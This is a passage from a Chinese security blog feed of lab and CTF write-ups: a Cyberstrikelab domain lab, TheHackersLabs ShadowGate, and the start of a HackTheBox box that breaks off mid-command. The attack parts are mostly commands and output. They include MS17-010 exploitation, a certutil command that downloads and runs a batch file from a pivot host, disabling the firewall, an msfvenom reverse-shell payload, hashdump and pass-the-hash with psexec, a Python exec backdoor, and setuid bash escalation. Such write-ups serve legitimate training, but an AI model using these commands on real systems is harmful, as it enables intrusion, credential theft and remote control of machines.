. : 192.168.10.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.10.233\n\n以太网适配器 以太网实例 0:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::dd76:17c3:eada:75fb%16\n   IPv4 地址 . . . . . . . . . . . . : 192.168.20.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.20.1\n\n隧道适配器 isatap.{4DA50EBB-5871-4387-AB71-FF1EF08A5B10}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\n隧道适配器 isatap.{0A087C82-408A-4C20-8EB3-4E5C11A340D7}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n```\n\n找到内网网段 `192.168.20.x`\n\n上传 `fscan` 扫描\n\n```php\nPS C:\\> ./fscan -h 192.168.20.1-255\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-12 07:42:18] [INFO] 暴力破解线程数: 1\n[2025-08-12 07:42:18] [INFO] 开始信息扫描\n[2025-08-12 07:42:18] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255\n[2025-08-12 07:42:18] [INFO] 最终有效主机数量: 255\n[2025-08-12 07:42:18] [INFO] 开始主机扫描\n[2025-08-12 07:42:18] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)\n[2025-08-12 07:42:21] [INFO] 存活主机数量: 3\n[2025-08-12 07:42:21] [INFO] 有效端口数量: 233\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.20:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:88\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:80\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:389\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:139\n[2025-08-12 07:42:26] [SUCCESS] 端口开放 192.168.20.10:3306\n[2025-08-12 07:42:26] [SUCCESS] 服务识别 192.168.20.10:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host 'WIN-KOHRC1DGOL9' is not allowed\nto connect to this MySQL server]\n[2025-08-12 07:42:27] [SUCCESS] 服务识别 192.168.20.30:88 => \n[2025-08-12 07:42:30] [SUCCESS] 服务识别 192.168.20.10:80 => [http]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:445 => \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:445 => \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:445 => \n[2025-08-12 07:42:36] [SUCCESS] 服务识别 192.168.20.30:389 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.30:135 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.20:135 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.10:135 => \n[2025-08-12 07:43:27] [INFO] 存活端口数量: 13\n[2025-08-12 07:43:27] [INFO] 开始漏洞扫描\n[2025-08-12 07:43:27] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.10\n主机名: WIN-KOHRC1DGOL9\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.10.10\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.20\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.20\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.30\n主机名: WIN-7NRTJO59O7N\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.30\n[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:30] [SUCCESS] 网站标题 http://192.168.20.10      状态码:200 长度:25229  标题:易优CMS -  Powered by Eyoucms.com\n[2025-08-12 07:43:40] [SUCCESS] 目标: http://192.168.20.10:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n```\n\n`192.168.20.20` 和 `30` 发现永恒之蓝\n\n## 192.168.20.20 - 1\n\n打永恒之蓝需要搭代理\n\n这里使用 `stowaway`\n\n```php\n./linux_x64_admin -l 8000 -s 123\n\nStart-Process -FilePath \"C:\\agent.exe\" -ArgumentList \"-c 172.16.233.2:8000 -s 123 --reconnect 8\"\n```\n\n```php\n(admin) >> use 0\n(node 0) >> socks 4444 admin admin\n[*] Trying to listen on 0.0.0.0:4444......\n[*] Waiting for agent's response......\n[*] Socks start successfully!\n```\n\n设置好代理后用 `MSF` 打永恒之蓝\n\n```php\n➜  Lab1 proxychains -q msfconsole\nsearch ms17_010\nuse 19\nset command whoami\nset rhost 192.168.20.20\nrun\n```\n\n但是这里应该是被修复了，先放着\n\n```php\nmsf6 auxiliary(admin/smb/ms17_010_command) > exploit\n\n[*] 192.168.20.20:445     - Target OS: Windows Server 2012 R2 Standard 9600\n[-] 192.168.20.20:445     - Unable to find accessible named pipe!\n[*] 192.168.20.20:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n## 192.168.20.30\n\n转换目标，打 `192.168.20.30`\n\n```php\nmsf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30\nrhost => 192.168.20.30\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command whoami\ncommand => whoami\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 192.168.20.30:445     - Target OS: Windows Server 2008 R2 Standard 7600\n[*] 192.168.20.30:445     - Built a write-what-where primitive...\n[+] 192.168.20.30:445     - Overwrite complete... SYSTEM session obtained!\n[+] 192.168.20.30:445     - Service start timed out, OK if running a command or non-service executable...\n[*] 192.168.20.30:445     - Getting the command output...\n[*] 192.168.20.30:445     - Executing cleanup...\n[+] 192.168.20.30:445     - Cleanup was successful\n[+] 192.168.20.30:445     - Command completed successfully!\n[*] 192.168.20.30:445     - Output for \"whoami\":\n\nnt authority\\system\n\n[*] 192.168.20.30:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n成功执行，准备上线 `Vshell` \n\n通过 `stowaway` 将监听端口映射到 `192.168.20.10`\n\n```php\n(node 0) >> backward 1234 1234\n[*] Trying to ask node to listen on 0.0.0.0:1234......\n[*] Waiting for agent's response......\n[*] Backward start successfully!\n```\n\n通过 `ms17_010` 进行上线\n\n```php\nset command \"certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\\\run.bat\"\nrun\nset command \"start C:\\\\run.bat\"\nrun\n```\n\n![image.png](/post-images/CyberstrikelabLab-1/image7.png)\n\n`C` 盘根目录能找到第二个 `flag`\n\n```php\ngo-flag{R0M4QwsS6EQp97lw}\n```\n\n关闭防火墙和开启远程桌面\n\n```php\nC:\\Windows\\system32>netsh advfirewall set allprofiles state off\n确定。\n\nC:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n操作成功完成。\n```\n\n信息收集，发现该机器就是 DC\n\n```php\nC:\\Windows\\system32>net view\n服务器名称            注解\n\n-------------------------------------------------------------------------------\n\\\\CYBERWEB\n\\\\WIN-7NRTJO59O7N\n命令成功完成。\n\nPS C:\\> net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32>net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32>net group \"domain controllers\"\n组名     Domain Controllers\n注释     域中所有域控制器\n\n成员\n\n-------------------------------------------------------------------------------\nWIN-7NRTJO59O7N$\n```\n\n上线 `MSF` ，和上面上线 `Vshell`的操作类似\n\n```php\n(node 0) >> backward 9009 9009\n[*] Trying to ask node to listen on 0.0.0.0:9009......\n[*] Waiting for agent's response......\n[*] Backward start successfully!\n```\n\n```php\nmsf6 exploit(multi/handler) > set lport 9009\nlport => 9009\nmsf6 exploit(multi/handler) > options\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)\n   LPORT     9009             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 0.0.0.0:9009 \n```\n\n```php\n➜  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.10 LPORT=9009 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: shell.exe\n```\n\n将 `shell.exe` 上传到 `192.168.20.30` ，然后运行\n\n![image.png](/post-images/CyberstrikelabLab-1/image8.png)\n\n抓取 `hash`\n\n```php\nmeterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::\ncyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::\nWIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::\nCYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::\n```\n\n## 192.168.20.20\n\n测试凭据\n\n```php\n➜  Lab1 proxychains -q nxc smb 192.168.20.20 -u administrator -H 94bd5248e87cb7f2f9b871d40c903927 \nSMB         192.168.20.20   445    CYBERWEB         [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) \nSMB         192.168.20.20   445    CYBERWEB         [+] cyberstrikelab.com\\administrator:94bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)\n```\n\n`PTH` 拿下\n\n```php\n➜  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on cyberweb.cyberstrikelab.com.....\n[*] Found writable share ADMIN$\n[*] Uploading file pqpIKIBX.exe\n[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....\n[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....\n[*] Starting service WhKD.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [�汾 6.3.9600]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) 2013 Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32>\n```\n\n读取第三个 `flag`\n\n```php\nC:\\> type flag.txt\ngo-flag{Nb8VOT8X9SbIzyDI}\n```",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1",
            "title": "Cyberstrikelab - Lab1",
            "summary": "Lab 1 https://www.cyberstrikelab.com/#/scene/detail/20 Youcms youcms 网上能找到 youcms 前台 getshell 的利用 https://blog.csdn.net/qq 48985780/article/details/12...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Cyberstrikelab",
                "Windows",
                "Vshell",
                "多层内网",
                "MS17_010"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate",
            "content_html": "\n# ShadowGate\n\n> https://labs.thehackerslabs.com/machine/97\n> \n\n![image.png](/post-images/TheHackersLabsShadowGate/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST\nNmap scan report for 192.168.56.105\nHost is up (0.00050s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n8080/tcp  open  http-proxy\n56789/tcp open  unknown\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 16.41 seconds\n```\n\n```bash\n➜  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST\nNmap scan report for 192.168.56.105\nHost is up (0.00047s latency).\n\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)\n|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)\n8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)\n|_http-title: 403 Forbidden\n|_http-server-header: Werkzeug/3.1.3 Python/3.12.3\n56789/tcp open  tcpwrapped\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.47 ms 192.168.56.105\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.07 seconds\n```\n\n### 枚举\n\n `8080` 端口\n\n提示错误的方法，但是你找到路径了\n\n![Snipaste_2025-08-05_21-30-52.png](/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png)\n\n改为 `POST` 方法后提示\n\n![image.png](/post-images/TheHackersLabsShadowGate/image1.png)\n\n没有任何信息，看一下其他端口\n\n奇怪的 `56789` 端口，`nc` 试一下\n\n```bash\n➜  ShadowGate nc 192.168.56.105 56789                 \nShadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.\nListening... but no response.\n```\n\n> 暗影之门 v1.0 :: 并非所有门都锁着。有些门在等待夜幕降临。仔细聆听——噪音中隐藏着规律。顺序总是很重要。\n聆听……但没有回应。\n> \n\n看着像是要向里边按顺序输入一下东西\n\n## 56789\n\n当我们输入 `n0cturne` 时，会出现好几串 `base64` 加密后的字符\n\n![image.png](/post-images/TheHackersLabsShadowGate/image2.png)\n\n并且重新输入生成的还是不一样的\n\n![image.png](/post-images/TheHackersLabsShadowGate/image3.png)\n\n根据特征，解密后得到 16字节 = 128位。这是现代分组密码（如 `AES-128`）最常见的块大小（Block Size）\n\n```bash\n// 第一次生成\nYzRmN2QzNQ==\nMwaB7TbchXxNQQwID9JXIg==\n7+ptCEtXTcCFo8dVwYrIEw==\nYAgEH6bP+PPY4VyD80z7sg==\na+T5dxugIDfFykgQi71Eag==\nfGMHS36e74T+cALZURlj8g==\nez4fog9UnAeemGETp6K2Aw==\nXZSJq2YIk3v/GM9R/NPa9w==\nsh6KfrTKDXndFadgySlIhA==\n\n// 第二次生成\nYzRmN2QzNQ==\n5/moJpOc9OpfYOHR6jl+bA==\nGWxuKkuzPn0t4aTSO0livQ==\nE2QIRlxnY+gWfTlVUcm4LA==\nYu9ChnO4fJxbMPPGbN04ug==\nNdNO8rDcGcLah47kqmnKBA==\ngFpBAQKKx1QDMNw60GkiwA==\n4eL9754ZX/qQYUk4s6Q9SA==\nMxte5TYR9OIZuzOmQDWAYg==\n```\n\n第一行解码为：`YzRmN2QzNQ==` >`c4f7d35`\n\n这里因为我对密码学不熟，查阅了一下 `WP`\n\n第一串编码应该是密钥\n\n```bash\n(more) ➜  ShadowGate echo -n \"c4f7d35\" | sha256sum\n7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -\n```\n\n然后在 `cyberchef` 进行解密，因为我们不知道 `IV` 以及加密模式，我们都可以进行测试一下，最后可以使用 `ECB/NoPadding` 进行解密\n\n解密第一次的密文\n\n![image.png](/post-images/TheHackersLabsShadowGate/image4.png)\n\n解密第二次的密文\n\n![image.png](/post-images/TheHackersLabsShadowGate/image5.png)\n\n可以发现每一段密文的第一个字符都是一样的，能拿到 `v4u1tgx9`\n\n## 8080\n\n拿到 `v4u1tgx9` 之后，我们应该可以对 `8080` 进行测试了\n\n输入 `username`\n\n![image.png](/post-images/TheHackersLabsShadowGate/image6.png)\n\n> 令牌已派出。你只需要……侧身看。\n> \n\n提示缺少 `Token` ，并且还看到相应保中带有 `MFA`（双重认证），是基于时间生成的 `TOTP` 一次性口令，无法直接爆破\n\n对目录进行爆破，尝试寻找更多接口\n\n```bash\n➜  ShadowGate ffuf -u 'http://192.168.56.105:8080/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fc 404,403 -X POST -H 'Content-Type: application/x-www-form-urlencoded'\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://192.168.56.105:8080/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 404,403\n________________________________________________\n\nlogin                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]\nverify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]\n```\n\n找到 `verify` 的端点，进行测试，所以 `login`是第一层认证，`verify` 是第二层认证\n\n将第一层的响应中的 `X-Shadow-MFA: 286346` 放到 `verify`中\n\n![image.png](/post-images/TheHackersLabsShadowGate/image7.png)\n\n添加后提示：” 承认。主动服务。“\n\n![image.png](/post-images/TheHackersLabsShadowGate/image8.png)\n\n回到 `56789`端口，原本的行为会被改变\n\n![image.png](/post-images/TheHackersLabsShadowGate/image9.png)\n\n得到一组凭据 `mars:sshpassword123`\n\n该用户能读取 `user.txt`\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ cat user.txt \nacf9xxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n查看正在监听端口\n\n存在一个本地打开 `4444` 端口\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ ss -tulpn\nNetid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    \nudp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              users:((\"socat\",pid=25904,fd=5))          \ntcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                           *:22                                   *:* \n```\n\n使用 `socat` 转发出来\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 &\n```\n\n进行交互\n\n![image.png](/post-images/TheHackersLabsShadowGate/image10.png)\n\n测试了一下有点懵\n\n在 `/opt` 中能找到源码\n\n```bash\nmars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py\n#!/usr/bin/env python3\nimport socket\nimport threading\nimport io\nimport contextlib\n\ndef handle_client(client_socket):\n    client_socket.send(b\"Welcome to Shadow Client Helper\\n\")\n    client_socket.send(b\"This is an unrestricted environment. Good luck, hacker.\\n\")\n    while True:\n        client_socket.send(b\">>> \")\n        code = client_socket.recv(1024).decode().strip()\n        try:\n            output = io.StringIO()\n            with contextlib.redirect_stdout(output):\n                exec(code, globals())\n            result = output.getvalue()\n            if result.strip():\n                client_socket.send(result.encode())\n        except Exception as e:\n            client_socket.send(f\"Error: {e}\\n\".encode())\n\ndef main():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"127.0.0.1\", 4444))\n    server.listen(5)\n    while True:\n        client, addr = server.accept()\n        client_handler = threading.Thread(target=handle_client, args=(client,))\n        client_handler.start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n简单来说，它创建了一个服务器，任何连接到这个服务器的客户端都可以执行任意的 Python 代码，并获取执行结果。 这本质上是一个远程代码执行（RCE, Remote Code Execution）的后门程序。\n\n这就简单了，输入\n\n```bash\n>>> import os;\n>>> os.system(\"chmod +s /bin/bash\")\n```\n\n回到靶机上查看\n\n![image.png](/post-images/TheHackersLabsShadowGate/image11.png)\n\n读取 `root.txt`\n\n```bash\nmars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p\nbash-5.2# cd /root\nbash-5.2# cat root.txt\n437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate",
            "title": "TheHackersLabs - ShadowGate",
            "summary": "ShadowGate https://labs.thehackerslabs.com/machine/97 Recon PortScan 枚举 8080 端口 提示错误的方法，但是你找到路径了 改为 POST 方法后提示 没有任何信息，看一下其他端口 奇怪的 56789 端口，nc 试一下 暗影之门...",
            "date_modified": "2025-08-06T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "MFA",
                "ffuf",
                "Python"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code",
            "content_html": "# Season7-Code\n\n> https://app.hackthebox.com/machines/653 | `esay`\n> \n\n## 前期踩点\n\n```bash\n⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT\nNmap scan report for 10.10.11.62\nHost is up (0.15s latency).\nNot shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 37.29 seconds\n```\n\n就扫描出一个`22`端口，不对劲继续扫\n\n```bash\n⚡ root@kali  ~/Desktop/test/Code  nmap -sS -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT\nWarning: 10.10.11.62 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.62\nHost is up (0.84s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap done: 1 IP address (1 host up) scanned in 33.23 seconds\n```\n\n新端口是一个代码编辑器`Python Code Editor`\n\n```bash\n⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT\nNmap scan report for 10.10.11.62\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)\n|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\n|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\n5000/tcp open  http    Gunicorn 20.0.4\n|_http-title: Python Code Editor\n|_http-server-header: gunicorn/20.0.4\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   204.69 ms 10.10.16.1\n2   156.61 ms 10.10.11.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.11 seconds\n```\n\n## WEB 渗透\n\n可以执行python命令，首先尝试一下`os` 库\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image56.png)\n\n提示`Use of restricted keywords is not allowed.` 经过测试是将`import` 、`os` 等关键字给过滤了\n\n右边可以创建账户，这里创建了用户`sunset`\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image57.png)\n\n可以看到存在`MyCodes` ，我们将代码保存为`test`试试\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image58.png)\n\n尝试一下语法注入\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image59.png)\n\n可以成功回显，再尝试一下使用模板语法\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image60.png)\n\n也是成功回显了，那么该应用是使用`Flask`搭建的`Web`应用\n\n使用`SSTImap`尝试模板注入\n\n```bash\npython sstimap.py -u http://10.10.11.62:5000/run_code -H 'application/x-www-form-urlencoded; charset=UTF-8' -m 'POST' -d 